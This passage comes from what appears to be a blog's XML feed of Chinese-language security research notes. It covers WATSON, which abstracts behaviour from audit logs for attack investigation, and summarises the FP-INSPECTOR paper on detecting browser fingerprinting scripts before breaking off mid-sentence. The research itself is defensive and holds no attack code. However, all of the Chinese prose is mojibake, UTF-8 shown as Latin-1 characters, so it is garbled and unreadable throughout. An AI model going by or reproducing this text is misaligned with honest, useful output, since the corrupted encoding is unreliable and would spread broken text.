”ç©¶åŠ¨æœºã€‚å…¶æ¬¡ï¼Œå½“è¦è§£å†³è‡ªå·±æå‡ºçš„é—®é¢˜ï¼Œå³å½“æ‰¾è§£å†³æ–¹æ³•çš„æ—¶å€™ï¼Œå¯ä»¥æ‰¾å…¶ä»–é¢†åŸŸçš„è§£å†³æ–¹æ¡ˆç„¶åå°†å…¶æ˜ å°„åˆ°è‡ªå·±çš„é¢†åŸŸé‡Œã€‚å½“ç„¶ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¸­ä¼šé‡åˆ°ä¸€äº›æ–°çš„æŒ‘æˆ˜ï¼Œè¿™éœ€è¦é è‡ªå·±å‰æœŸç§¯ç´¯çš„ä¸€äº›èƒŒæ™¯çŸ¥è¯†æ¥è§£å†³ã€‚</p><p>æ€»çš„æ¥è¯´ï¼Œæ‰¾åˆ°ä¸€ä¸ªæ„Ÿå…´è¶£çš„æ–°æ–¹å‘ï¼Œç¬¬ä¸€æ˜¯æ€»ç»“å‰å‡ åå¹´çš„å‰äººçš„å·¥ä½œï¼Œå®Œå¤‡è‡ªå·±çš„çŸ¥è¯†å‚¨å¤‡ï¼›ç¬¬äºŒå°±æ˜¯è¯»å…¶ä»–é¢†åŸŸçš„è®ºæ–‡ï¼Œæ‰¾åˆ°è§£å†³æ–¹æ¡ˆæ¥è§£å†³é‡åˆ°çš„ç ”ç©¶é—®é¢˜ã€‚åŒæ—¶ï¼Œå½“è¦å°†ä¸€æ¡ç ”ç©¶çº¿åšæ·±çš„æ—¶å€™ï¼Œåç»­çš„ä»£ç å¯ä»¥ä¾æ®å‰ä¸€æ¬¡å®éªŒçš„åŸºç¡€ï¼Œä¾‹å¦‚å°†ä¸€ä¸ªè®ºæ–‡çš„å®ç°åšæˆ tool æˆ–è€… systemã€‚</p><p><strong>ç«¯ç‚¹ç›‘è§†è§£å†³æ–¹æ¡ˆè®°å½•ç”¨äºæ”»å‡»è°ƒæŸ¥çš„å®¡è®¡æ—¥å¿—</strong><br>å®¡è®¡æ—¥å¿—ï¼š</p><ul><li>è¡¨ç¤º OS çº§æ´»åŠ¨çš„äº‹ä»¶å†å²è®°å½•</li><li>é€šè¿‡æ•°æ®è¯æ˜ä¸ºå®‰å…¨äº‹ä»¶æä¾›å¯è§æ€§</li></ul><p><strong>è¡Œä¸ºæŠ½è±¡ä¸­çš„æŒ‘æˆ˜</strong></p><ol><li>äº‹ä»¶è¯­ä¹‰æ¨æ–­ï¼šæ—¥å¿—è®°å½•ä¸€èˆ¬ç”¨é€”çš„ç³»ç»Ÿæ´»åŠ¨ï¼Œä½†ç¼ºä¹é«˜çº§è¯­ä¹‰çš„çŸ¥è¯†</li><li>ä¸ªäººè¡Œä¸ºè¯†åˆ«ï¼šå®¡è®¡æ—¥å¿—çš„æ•°é‡æ˜¯ååˆ†åºå¤§çš„</li></ol><p><strong>Insights</strong><br>Q: åˆ†æè€…å¦‚ä½•æ‰‹åŠ¨è§£é‡Šå®¡è®¡äº‹ä»¶çš„è¯­ä¹‰ï¼Ÿ</p><ol><li>é€šè¿‡å®¡è®¡äº‹ä»¶ä¸­çš„ä¸Šä¸‹æ–‡ä¿¡æ¯æ¥æ­ç¤ºç³»ç»Ÿå®ä½“å’Œå…³ç³»çš„è¯­ä¹‰ã€‚æå–è¿™ç§ä¸Šä¸‹æ–‡è¯­ä¹‰çš„ä¸€èˆ¬æ–¹æ³•æ˜¯é‡‡ç”¨åµŒå…¥æ¨¡å‹ï¼Œç›®çš„æ˜¯å°†ç³»ç»Ÿå®ä½“å’Œå…³ç³»æ˜ å°„åˆ°åµŒå…¥ç©ºé—´ï¼ˆå³æ•°å­—çŸ¢é‡ç©ºé—´ï¼‰ã€‚</li><li>è¯†åˆ«åŸºäºæ•°æ®å¯¹è±¡çš„ä¿¡æ¯æµçš„è¡Œä¸ºã€‚æ–‡ä¸­å…·ä½“æŒ‡çš„æ˜¯å±äºä¸ªäººè¡Œä¸ºçš„å®¡è®¡äº‹ä»¶ï¼Œä¸»è¦æ˜¯å›´ç»•ç€ç”¨æˆ·çš„é¢„æœŸç›®æ ‡ï¼Œå¯ä»¥åæ˜ ä¸ºä¸€ç³»åˆ—åº”ç”¨äºæ•°æ®å¯¹è±¡çš„ç³»ç»Ÿæ“ä½œã€‚å¦‚ä¸‹å›¾åšä¸€æ¬¡å®¡è®¡äº‹ä»¶çš„ç®€åŒ–ã€‚<img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/1d8d7347-39f5-4afd-9a06-bdde9859e815.png" style="zoom: 70%;"></li></ol><p><strong>WATSON</strong><br>WATSON æ˜¯ä¸€ç§è‡ªåŠ¨åŒ–çš„è¡Œä¸ºæŠ½è±¡æ–¹æ³•ï¼Œå®ƒèšé›†äº†å®¡è®¡äº‹ä»¶çš„è¯­ä¹‰æ¥æ¨¡æ‹Ÿè¡Œä¸ºæ¨¡å¼ã€‚å®ƒä¸éœ€è¦ä¸“å®¶å¯¹äº‹ä»¶è¯­ä¹‰çš„äº†è§£æ¥æ‰§è¡Œè¡Œä¸ºæŠ½è±¡ã€‚è¯­ä¹‰æ˜¯ä»å®¡è®¡æ—¥å¿—ä¸­çš„äº‹ä»¶ä½¿ç”¨èƒŒæ™¯ä¸­è‡ªåŠ¨è·å¾—çš„ï¼Œè¿™ä¸ªèƒŒæ™¯è¢«ç§°ä¸ºæ˜¯äº‹ä»¶çš„ä¸Šä¸‹æ–‡è¯­ä¹‰ã€‚å…·ä½“æ¥è¯´ï¼ŒWATSON é¦–å…ˆåˆ©ç”¨åŸºäºç¿»è¯‘çš„åµŒå…¥æ¨¡å‹æ¥æ¨æ–­å®¡è®¡äº‹ä»¶çš„è¯­ä¹‰ï¼Œå…¶ä¾æ®æ˜¯æ—¥å¿—ä¸­çš„è¯­å¢ƒä¿¡æ¯ã€‚ ç„¶åï¼ŒWATSON è¯†åˆ«å‡ºä¸ç›¸å…³æ•°æ®å¯¹è±¡ï¼ˆå³æ–‡ä»¶å’Œç½‘ç»œå¥—æ¥å­—ï¼‰ç›¸è¿çš„äº‹ä»¶ï¼Œå¹¶å°†å…¶è¯­ä¹‰æ±‡æ€»ä¸ºé«˜çº§è¡Œä¸ºçš„è¡¨ç¤ºã€‚æœ€åï¼ŒWATSON å¯¹å®¡è®¡æ—¥å¿—ä¸­è®°å½•çš„ç±»ä¼¼è¡Œä¸ºè¿›è¡Œèšç±»ï¼Œå¹¶åŒºåˆ†å‡ºå…¶ä¸­çš„ä»£è¡¨ï¼Œä¾›åˆ†æäººå‘˜è°ƒæŸ¥ã€‚</p><p>ç®€è€Œè¨€ä¹‹ï¼ŒWATSON æ˜¯ä¸€ç§è‡ªåŠ¨çš„è¡Œä¸ºæŠ½è±¡æ–¹æ³•ï¼Œå®ƒèšåˆäº†å®¡è®¡æ—¥å¿—çš„è¯­ä¹‰æ¥å»ºæ¨¡è¡Œä¸ºæ¨¡å¼ã€‚å…¶è¾“å…¥ä¸ºå®¡è®¡æ—¥å¿—(Linux Audit)ï¼Œè¾“å‡ºåˆ™æ˜¯å…·æœ‰ä»£è¡¨æ€§çš„è¡Œä¸ºã€‚</p><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/7a6aa663-2228-430a-9da0-a6eea26f1211.png"></p><p>WATSON å¼¥è¡¥äº†ä½çº§å®¡è®¡æ—¥å¿—ä¸é«˜çº§ç³»ç»Ÿè¡Œä¸ºä¹‹é—´çš„è¯­ä¹‰é¸¿æ²Ÿï¼š</p><ul><li>åœ¨åŸºäºæ—¥å¿—çš„ KG ä¸­ä½¿ç”¨ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼ˆäº‹ä»¶è¯­ä¹‰æ¨æ–­ï¼‰</li><li>åœ¨è¯­ä¹‰ä¸Šèšç±»ç›¸ä¼¼è¡Œä¸ºï¼ˆè¡Œä¸ºæ€»ç»“ï¼‰</li></ul>]]></content>
      
      
      <categories>
          
          <category> Conference </category>
          
      </categories>
      
      
        <tags>
            
            <tag> InForSec 2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PR - Fingerprinting the Fingerprinters: Learning to Detect Browser Fingerprinting Behaviors</title>
      <link href="/2021/06/01/Fingerprinting%20the%20Fingerprinters%20-%20Learning%20to%20Detect%20Browser%20Fingerprinting%20Behaviors/"/>
      <url>/2021/06/01/Fingerprinting%20the%20Fingerprinters%20-%20Learning%20to%20Detect%20Browser%20Fingerprinting%20Behaviors/</url>
      
        <content type="html"><![CDATA[<blockquote><p><em>åŸæ–‡ä½œè€…ï¼šU Iqbal, S Englehardt, Z Shafiq</em></p><p><em>åŸæ–‡æ ‡é¢˜ï¼šFingerprinting the Fingerprinters: Learning to Detect Browser Fingerprinting Behaviors</em></p><p><em>åŸæ–‡é“¾æ¥ï¼š<a href="https://conferences.computer.org/sppub/pdfs/sp/2021/893400b143.pdf">https://conferences.computer.org/sppub/pdfs/sp/2021/893400b143.pdf</a></em></p><p><em>åŸæ–‡æ¥æºï¼šS&amp;P 2021</em></p><p><em>ç¬”è®°ä½œè€…ï¼šoutx</em></p></blockquote><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«æ˜¯ä¸€ç§ä¾µå…¥æ€§çš„ã€ä¸é€æ˜çš„æ— çŠ¶æ€è·Ÿè¸ªæŠ€æœ¯ã€‚æµè§ˆå™¨ä¾›åº”å•†ã€å­¦æœ¯ç•Œå’Œæ ‡å‡†æœºæ„é•¿æœŸä»¥æ¥ä¸€ç›´åœ¨åŠªåŠ›æä¾›æœ‰æ•ˆçš„ä¿æŠ¤æªæ–½ï¼Œä»¥åœ¨åˆä¸é™ä½ç”¨æˆ·ä½“éªŒçš„å‰æä¸‹å°½å¯èƒ½é˜²æ­¢æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«ã€‚ä½œè€…æå‡ºäº†FP-INSPECTORï¼Œä¸€ç§åŸºäºæœºå™¨å­¦ä¹ çš„å¥æ³•-è¯­ä¹‰åº”ç”¨æ–¹æ³•ï¼Œä»¥å‡†ç¡®æ£€æµ‹æµè§ˆå™¨çš„æŒ‡çº¹ã€‚æ ¹æ®å®éªŒç»“æœæ¥çœ‹ï¼ŒFP-INSPECTORè¡¨ç°è‰¯å¥½ï¼Œå®ƒèƒ½å¤Ÿæ¯”æœ€å…ˆè¿›çš„æŠ€æœ¯å¤šæ£€æµ‹26%çš„æŒ‡çº¹è„šæœ¬ã€‚åŒæ—¶ï¼Œå»ºç«‹åœ¨FP-INSPECTORåŸºç¡€ä¸Šçš„APIçº§æŒ‡çº¹ååˆ¶æªæ–½æœ‰åŠ©äºå‡å°‘2å€å½±å“ç½‘ç«™å®Œæ•´æ€§çš„å› ç´ ã€‚ç»“æœè¡¨æ˜ï¼Œç°åœ¨æœ‰è¶…è¿‡10%çš„å‰10ä¸‡ç½‘ç«™å’Œè¶…è¿‡å››åˆ†ä¹‹ä¸€çš„å‰10ä¸‡ç½‘ç«™å­˜åœ¨æµè§ˆå™¨æŒ‡çº¹ã€‚ä½œè€…è¿˜å‘ç°äº†ä»¥å‰æ²¡æœ‰æŠ¥é“è¿‡çš„æŒ‡çº¹è„šæœ¬å¯¹JavaScript APIçš„ä½¿ç”¨ï¼Œè¿™è¡¨æ˜è¿™äº›æŒ‡çº¹è„šæœ¬æ­£åœ¨ä»¥ä¸€äº›å‡ºäººæ„æ–™çš„æ–¹å¼æ¥åˆ©ç”¨APIã€‚</p><h2 id="ä¸»è¦è´¡çŒ®"><a href="#ä¸»è¦è´¡çŒ®" class="headerlink" title="ä¸»è¦è´¡çŒ®"></a>ä¸»è¦è´¡çŒ®</h2><ol><li>ä¸€ç§åŸºäºMLçš„è¯­æ³•-è¯­ä¹‰æ–¹æ³•ï¼Œç»“åˆäº†é™æ€å’ŒåŠ¨æ€åˆ†ææ¥æ£€æµ‹æµè§ˆå™¨æŒ‡çº¹è¡Œä¸ºã€‚</li><li>è¯„ä¼°ç”±ä¸åŒçš„ç¼“è§£ç­–ç•¥å¼•èµ·çš„ç½‘ç«™ä¸å®Œæ•´æ€§ï¼Œè¿™äº›ç­–ç•¥é˜»æ­¢äº†ç½‘ç»œè¯·æ±‚æˆ–é™åˆ¶äº†APIã€‚</li><li>ä¸€é¡¹é’ˆå¯¹Alexaæ’åå‰10ä¸‡çš„ç½‘ç«™ä¸Šæµè§ˆå™¨æŒ‡çº¹è„šæœ¬çš„æµ‹é‡ç ”ç©¶</li><li>å¯¹JavaScript APIsè¿›è¡Œèšç±»åˆ†æä»¥å‘ç°æ–°çš„æµè§ˆå™¨æŒ‡çº¹è½½ä½“ã€‚</li></ol><h1 id="FP-INSPECTOR"><a href="#FP-INSPECTOR" class="headerlink" title="FP-INSPECTOR"></a>FP-INSPECTOR</h1><p><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/99e0d167-1b6c-424d-8a3c-2b98633726d7.png"></p><h2 id="æ£€æµ‹æŒ‡çº¹è„šæœ¬"><a href="#æ£€æµ‹æŒ‡çº¹è„šæœ¬" class="headerlink" title="æ£€æµ‹æŒ‡çº¹è„šæœ¬"></a>æ£€æµ‹æŒ‡çº¹è„šæœ¬</h2><p>é¦–å…ˆï¼ŒFP-INSPECTORå¹¶ä¸ä¾èµ–æ‰‹å·¥ç¼–ç çš„å¯å‘å¼æ–¹æ³•ï¼Œè€Œæ˜¯ä¼šè‡ªè¡Œå­¦ä¹ æŒ‡çº¹è„šæœ¬çš„æ–°å±æ€§ã€‚å…·ä½“æ¥è¯´ï¼Œä½œè€…æå–äº†å¤§é‡çš„ä½çº§å¯å‘å¼æ–¹æ³•æ¥æ•æ‰æŒ‡çº¹è„šæœ¬çš„å¥æ³•å’Œè¯­ä¹‰ç‰¹æ€§ï¼Œä»¥è®­ç»ƒæœºå™¨å­¦ä¹ åˆ†ç±»å™¨ã€‚FP-INSPECTORåˆ†ç±»å™¨æ˜¯åœ¨å·²æœ‰ç ”ç©¶çš„æŒ‡çº¹è„šæœ¬çš„åŸºç¡€ä¸Šè®­ç»ƒå‡ºæ¥çš„ï¼Œä¸”èƒ½å¤Ÿæ¨å¹¿ä¸ºæ£€æµ‹æ–°çš„æŒ‡çº¹è„šæœ¬å’Œä»¥å‰æœªçŸ¥çš„æŒ‡çº¹æ–¹æ³•ã€‚</p><p>ç¬¬äºŒï¼Œä½œè€…åŒæ—¶åˆ©ç”¨äº†é™æ€ç‰¹å¾ï¼ˆå³è„šæœ¬è¯­æ³•ï¼‰å’ŒåŠ¨æ€ç‰¹å¾ï¼ˆå³è„šæœ¬çš„æ‰§è¡Œï¼‰ã€‚é™æ€è¡¨å¾ä½¿å…¶èƒ½å¤Ÿæ•è·åœ¨é¡µé¢è®¿é—®æœŸé—´å¯èƒ½ä¸ä¼šæ‰§è¡Œçš„æŒ‡çº¹è„šæœ¬æˆ–ç¨‹åºï¼ˆä¾‹å¦‚ï¼Œå› ä¸ºå®ƒä»¬éœ€è¦ç”¨æˆ·äº’åŠ¨ï¼Œè€Œåœ¨è‡ªåŠ¨æŠ“å–è¿‡ç¨‹ä¸­å¾ˆéš¾æ¨¡æ‹Ÿï¼‰ã€‚åŠ¨æ€è¡¨å¾ä½¿å…¶èƒ½å¤Ÿæ•æ‰åˆ°è¢«æ··æ·†çš„æŒ‡çº¹è„šæœ¬ã€‚FP-INSPECTORé’ˆå¯¹é™æ€å’ŒåŠ¨æ€è¡¨å¾åˆ†åˆ«è®­ç»ƒæœ‰ç›‘ç£çš„æœºå™¨å­¦ä¹ æ¨¡å‹ï¼Œå¹¶ç»“åˆå®ƒä»¬çš„è¾“å‡ºæ¥å‡†ç¡®åœ°å°†è„šæœ¬åˆ†ç±»ä¸ºæŒ‡çº¹æˆ–éæŒ‡çº¹è„šæœ¬ã€‚</p><h3 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h3><p>é™æ€åˆ†æèƒ½å¤Ÿä»JavaScriptæ–‡ä»¶çš„å†…å®¹å’Œç»“æ„ä¸­æ•è·ä¿¡æ¯â€”â€”åŒ…æ‹¬é‚£äº›åœ¨åº¦é‡è¿‡ç¨‹ä¸­æ²¡æœ‰æ‰§è¡Œçš„ä¿¡æ¯ï¼Œæˆ–è€…é‚£äº›æ²¡æœ‰è¢«ä½œè€…æ‰€æ‰©å±•çš„æ£€æµ‹è¦†ç›–çš„ä¿¡æ¯ã€‚</p><p><strong>ASTè¡¨ç¤ºæ³•.</strong><br>é¦–å…ˆï¼Œä½œè€…å°†è„šæœ¬è¡¨ç¤ºä¸ºæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ã€‚è¿™æ ·åšä¾¿å¯ä»¥å¿½ç•¥è„šæœ¬ä¹‹é—´çš„ç¼–ç é£æ ¼å·®å¼‚å’Œä¸æ–­å˜åŒ–çš„JavaScriptè¯­æ³•ã€‚ASTå°†è„šæœ¬ç¼–ç ä¸ºä¸€æ£µè¯­æ³•åŸºå…ƒæ ‘ï¼ˆä¾‹å¦‚ï¼ŒVariableDeclarationå’ŒForStatementï¼‰ï¼Œå…¶è¾¹ç¼˜ä»£è¡¨ä»£ç è¯­å¥ä¹‹é—´çš„è¯­æ³•å…³ç³»ã€‚</p><p><strong>è„šæœ¬è§£åŒ….</strong><br>å°†è„šæœ¬è¡¨ç¤ºä¸ºASTçš„è¿‡ç¨‹å¾ˆå¤æ‚ï¼Œå› ä¸ºJavaScriptæ˜¯ä¸€ç§è§£é‡Šè¯­è¨€ï¼Œåœ¨è¿è¡Œæ—¶ç¼–è¯‘ã€‚è¿™å…è®¸è„šæœ¬çš„éƒ¨åˆ†å†…å®¹ä»¥çº¯æ–‡æœ¬çš„å½¢å¼å­˜åœ¨ï¼Œç„¶åç”¨evalæˆ–Functionç¼–è¯‘å’Œæ‰§è¡Œã€‚ä¹‹å‰çš„å·¥ä½œè¡¨æ˜ï¼ŒæŒ‡çº¹è„šæœ¬é€šå¸¸åŒ…æ‹¬è¢«evalæˆ–Functionæ‰€æ‹¬èµ·æ¥çš„ä»£ç ã€‚ä¸ºäº†è§£å¼€å«æœ‰evalæˆ–Functionçš„è„šæœ¬ï¼Œä½œè€…å°†å®ƒä»¬åµŒå…¥åˆ°ç©ºçš„HTMLç½‘é¡µä¸­ï¼Œå¹¶åœ¨ä¸€ä¸ªå·¥å…·åŒ–çš„æµè§ˆå™¨ä¸­æ‰“å¼€ï¼Œè¿™æ ·å°±å¯ä»¥åœ¨JavaScriptå¼•æ“è§£æè„šæœ¬æ—¶æå–å®ƒä»¬ã€‚</p><p><strong>é™æ€ç‰¹å¾æå–</strong><br>ä½œè€…æ˜¯ä»ASTsç”Ÿæˆçš„é™æ€ç‰¹å¾ã€‚ä¸ºäº†å»ºç«‹ç‰¹å¾é›†ï¼Œä½œè€…é¦–å…ˆåˆ†å±‚éå†ASTï¼Œå¹¶å°†å®ƒä»¬åˆ†æˆä¸€å¯¹çˆ¶èŠ‚ç‚¹å’Œå­èŠ‚ç‚¹ã€‚çˆ¶èŠ‚ç‚¹ä»£è¡¨ä¸Šä¸‹æ–‡ï¼ˆå¦‚for loopsã€try statementsæˆ–if conditionsï¼‰ï¼Œå­èŠ‚ç‚¹ä»£è¡¨è¯¥ä¸Šä¸‹æ–‡ä¸­çš„å‡½æ•°ï¼ˆå¦‚createElementã€toDataURLå’ŒmeasureTextï¼‰ã€‚ç®€å•åœ°è§£ææ¯ä¸ªè„šæœ¬çš„æ•´ä¸ªASTçš„çˆ¶å­å¯¹ä¼šå¯¼è‡´æ‰€æœ‰è„šæœ¬çš„ç‰¹å¾æ•°é‡è¿‡å¤§ï¼ˆå³æ•°ç™¾ä¸‡ï¼‰ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œä½œè€…åªè€ƒè™‘çˆ¶å­å¯¹ä¸­è‡³å°‘æœ‰ä¸€ä¸ªå…³é”®è¯ä¸JavaScript APIä¸­çš„åç§°ã€æ–¹æ³•æˆ–å±æ€§ç›¸åŒ¹é…ã€‚ä½œè€…å°†è¿™äº›çˆ¶å­èŠ‚ç‚¹çš„ç»„åˆä½œä¸ºæ‰€æœ‰è„šæœ¬çš„ç‰¹å¾å‘é‡è¿›è¡Œç»„åˆï¼Œæ¯ä¸ªçˆ¶å­èŠ‚ç‚¹ç»„åˆéƒ½è¢«è§†ä¸ºä¸€ä¸ªäºŒè¿›åˆ¶ç‰¹å¾ï¼ˆå…¶ä¸­1è¡¨ç¤ºå­˜åœ¨ä¸€ä¸ªç‰¹å¾ï¼Œ0è¡¨ç¤ºæ²¡æœ‰ï¼‰ã€‚</p><p>ä¸ºäº†é¿å…è¿‡åº¦æ‹Ÿåˆï¼Œä½œè€…é‡‡ç”¨äº†æ— ç›‘ç£å’Œæœ‰ç›‘ç£çš„ç‰¹å¾é€‰æ‹©æ–¹æ³•æ¥å‡å°‘ç‰¹å¾çš„æ•°é‡ã€‚å…·ä½“æ¥è¯´ï¼Œé¦–å…ˆå»æ‰é‚£äº›å˜åŒ–ä¸å¤§çš„ç‰¹å¾ï¼ˆå³æ–¹å·®&lt;0.01ï¼‰ï¼Œå¹¶ä½¿ç”¨ä¿¡æ¯å¢ç›Šæ¥ç¼©çŸ­å‰ä¸€åƒåçš„ç‰¹å¾åˆ—è¡¨ã€‚è¿™ä½¿å¾—FP-INSPECTORèƒ½å¤Ÿä¿ç•™ä»£è¡¨æœ€å¸¸ç”¨çš„æŒ‡çº¹è¯†åˆ«APIçš„ç‰¹å¾ã€‚</p><h3 id="åŠ¨æ€åˆ†æ"><a href="#åŠ¨æ€åˆ†æ" class="headerlink" title="åŠ¨æ€åˆ†æ"></a>åŠ¨æ€åˆ†æ</h3><p>è™½ç„¶é™æ€åˆ†æèƒ½å¤Ÿæ•æ‰åˆ°è„šæœ¬çš„è¯­æ³•ç»“æ„ï¼Œä½†å½“è„šæœ¬è¢«æ··æ·†æˆ–å‡åŒ–æ—¶ï¼Œé™æ€åˆ†æçš„æ•ˆæœä¼šå—åˆ°å¾ˆå¤§çš„å½±å“ã€‚è¿™ä¸€ç‚¹è‡³å…³é‡è¦ï¼Œå› ä¸ºä¹‹å‰çš„ç ”ç©¶è¡¨æ˜ï¼ŒæŒ‡çº¹è„šæœ¬ç»å¸¸ä½¿ç”¨æ··æ·†æ¥éšè—å…¶åŠŸèƒ½ã€‚é™¤äº†ä»è„šæœ¬å†…å®¹ä¸­æå–é™æ€ç‰¹å¾å¤–ï¼Œä½œè€…è¿˜é€šè¿‡ç›‘æ§è„šæœ¬çš„æ‰§è¡Œæ¥æå–åŠ¨æ€ç‰¹å¾ã€‚æ‰§è¡Œè·Ÿè¸ªå¯ä»¥æ•æ‰åˆ°è„šæœ¬ä¸­çš„è¯­ä¹‰å…³ç³»è€Œæ— è§†æ··æ·†æ‰€å¸¦æ¥çš„å½±å“ï¼Œè¿™ä½¿å¾—ä½œè€…èƒ½å¤Ÿæå–æœ‰å…³è„šæœ¬åŠŸèƒ½çš„ç›¸å…³ä¿¡æ¯ã€‚</p><p><strong>åŠ¨æ€ç‰¹å¾æå–</strong><br>ä½œè€…ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ¥ä»æ‰§è¡Œè¿‡ç¨‹ä¸­æå–ç‰¹å¾ã€‚é¦–å…ˆï¼Œå¯¹è„šæœ¬è®¿é—®æ¯ä¸ªå•ç‹¬çš„APIæ–¹æ³•æˆ–å±æ€§çš„æ¬¡æ•°è¿›è¡Œè®°å½•å’Œç»Ÿè®¡ï¼Œå¹¶å°†å…¶ä½œä¸ºä¸€ä¸ªç‰¹å¾ã€‚æ¥ä¸‹æ¥ï¼Œä½œè€…ä»æ”¯æŒå‚æ•°ä¼ é€’æˆ–å­˜åœ¨è¿”å›å€¼çš„APIä¸­å»ºç«‹ç‰¹å¾ã€‚ä½œè€…æ²¡æœ‰ç›´æ¥ä½¿ç”¨å‚æ•°æˆ–è¿”å›å€¼ï¼Œè€Œæ˜¯ä½¿ç”¨æ´¾ç”Ÿå€¼æ¥æ•æ‰æ›´é«˜å±‚æ¬¡çš„è¯­ä¹‰ï¼Œä»¥ä¾¿åœ¨åˆ†ç±»è¿‡ç¨‹ä¸­æ›´å¥½åœ°è¿›è¡Œæ³›åŒ–ã€‚</p><p>ä¸ºäº†é¿å…è¿‡åº¦æ‹Ÿåˆï¼Œä½œè€…å†æ¬¡åº”ç”¨æ— ç›‘ç£å’Œæœ‰ç›‘ç£çš„ç‰¹å¾é€‰æ‹©æ–¹æ³•æ¥é™åˆ¶ç‰¹å¾çš„æ•°é‡ã€‚ä¸é™æ€åˆ†æçš„ç‰¹å¾å‡å°‘ç±»ä¼¼ï¼Œè¿™ä½¿å…¶èƒ½å¤Ÿä¿ç•™ä»£è¡¨æœ€å¸¸ç”¨çš„APIçš„ç‰¹å¾ï¼Œä»¥ä¾¿è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ã€‚ç„¶åï¼Œä½œè€…åˆ©ç”¨æ’åå‰ä¸€åƒåçš„ç‰¹å¾ä½œä¸ºè¾“å…¥ï¼Œè®­ç»ƒäº†ä¸€ä¸ªæœ‰ç›‘ç£çš„æœºå™¨å­¦ä¹ æ¨¡å‹ã€‚</p><h3 id="å¯¹æŒ‡çº¹è„šæœ¬è¿›è¡Œåˆ†ç±»"><a href="#å¯¹æŒ‡çº¹è„šæœ¬è¿›è¡Œåˆ†ç±»" class="headerlink" title="å¯¹æŒ‡çº¹è„šæœ¬è¿›è¡Œåˆ†ç±»"></a>å¯¹æŒ‡çº¹è„šæœ¬è¿›è¡Œåˆ†ç±»</h3><p>FP-INSPECTORä½¿ç”¨äº†å†³ç­–æ ‘åˆ†ç±»å™¨æ¥è®­ç»ƒä¸€ä¸ªæœºå™¨å­¦ä¹ æ¨¡å‹ã€‚å†³ç­–æ ‘æ˜¯é€šè¿‡è„šæœ¬çš„ç‰¹å¾å‘é‡æ¥è¿›è¡Œåˆ†ç±»çš„ã€‚åœ¨æ„å»ºæ ‘çš„è¿‡ç¨‹ä¸­ï¼Œå†³ç­–æ ‘ä¼šåœ¨æ¯ä¸ªèŠ‚ç‚¹ä¸Šé€‰æ‹©èƒ½æœ€æœ‰æ•ˆåœ°åˆ†å‰²æ•°æ®çš„ç‰¹å¾ã€‚å…·ä½“æ¥è¯´ï¼Œé€‰æ‹©å…·æœ‰æœ€é«˜ä¿¡æ¯å¢ç›Šçš„å±æ€§ï¼Œé€šè¿‡ä¸°å¯Œä¸€ä¸ªç±»æ¥åˆ†å‰²æ•°æ®ã€‚ç„¶åï¼Œå†³ç­–æ ‘éµå¾ªåŒæ ·çš„æ–¹æ³•æ¥é€’å½’åˆ’åˆ†å­é›†ï¼Œé™¤éè¯¥å­é›†å±äºä¸€ä¸ªç±»åˆ«æˆ–ä¸èƒ½å†è¢«åˆ’åˆ†ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ä½œè€…è®­ç»ƒäº†ä¸¤ä¸ªç‹¬ç«‹çš„æ¨¡å‹ï¼Œå¹¶å°†å®ƒä»¬çš„åˆ†ç±»ç»“æœè”åˆèµ·æ¥ï¼Œè€Œä¸æ˜¯å°†è„šæœ¬çš„é™æ€å’ŒåŠ¨æ€ç‰¹å¾ç»“åˆèµ·æ¥è®­ç»ƒä¸€ä¸ªæ¨¡å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä¸€ä¸ªè„šæœ¬è¢«ä½¿ç”¨é™æ€ç‰¹å¾ä½œä¸ºè¾“å…¥çš„æ¨¡å‹æˆ–ä½¿ç”¨åŠ¨æ€ç‰¹å¾ä½œä¸ºè¾“å…¥çš„æ¨¡å‹å½’ç±»ä¸ºæŒ‡çº¹è„šæœ¬ï¼Œé‚£ä¹ˆå®ƒå°±è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªæŒ‡çº¹è„šæœ¬ã€‚é€šè¿‡ä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œä½œè€…å¯¹é¡µé¢è®¿é—®è¿‡ç¨‹ä¸­åŠ è½½çš„æ‰€æœ‰è„šæœ¬è¿›è¡Œåˆ†ç±»ã€‚è¿™äº›è„šæœ¬åŒ…æ‹¬ä»å•ç‹¬çš„URLåŠ è½½çš„å¤–éƒ¨è„šæœ¬å’Œä»»ä½•HTMLæ–‡æ¡£ä¸­åŒ…å«çš„å†…è”è„šæœ¬ã€‚</p><h2 id="æŒ‡çº¹è„šæœ¬å¯¹æŠ—æªæ–½"><a href="#æŒ‡çº¹è„šæœ¬å¯¹æŠ—æªæ–½" class="headerlink" title="æŒ‡çº¹è„šæœ¬å¯¹æŠ—æªæ–½"></a>æŒ‡çº¹è„šæœ¬å¯¹æŠ—æªæ–½</h2><p>ç°æœ‰çš„æµè§ˆå™¨æŒ‡çº¹å¯¹æŠ—æªæ–½å¯åˆ†ä¸ºå†…å®¹å°é”å’Œ API é™åˆ¶ä¸¤å¤§ç±»ã€‚å†…å®¹æ‹¦æˆªä¼šæ ¹æ®ç”¨æˆ·çš„ç½‘ç»œä½ç½®(ä¾‹å¦‚ï¼ŒåŸŸåæˆ– URL)é˜»æ­¢ç”¨æˆ·ä¸‹è½½æŒ‡çº¹è„šæœ¬ã€‚è€ŒAPI é™åˆ¶å¹¶ä¸ä¼šé˜»æ­¢æŒ‡çº¹è¯†åˆ«è„šæœ¬çš„åŠ è½½ï¼Œè€Œæ˜¯é™åˆ¶äº†å¯¹æŸäº› JavaScript API çš„è®¿é—®ï¼Œè¿™äº› API 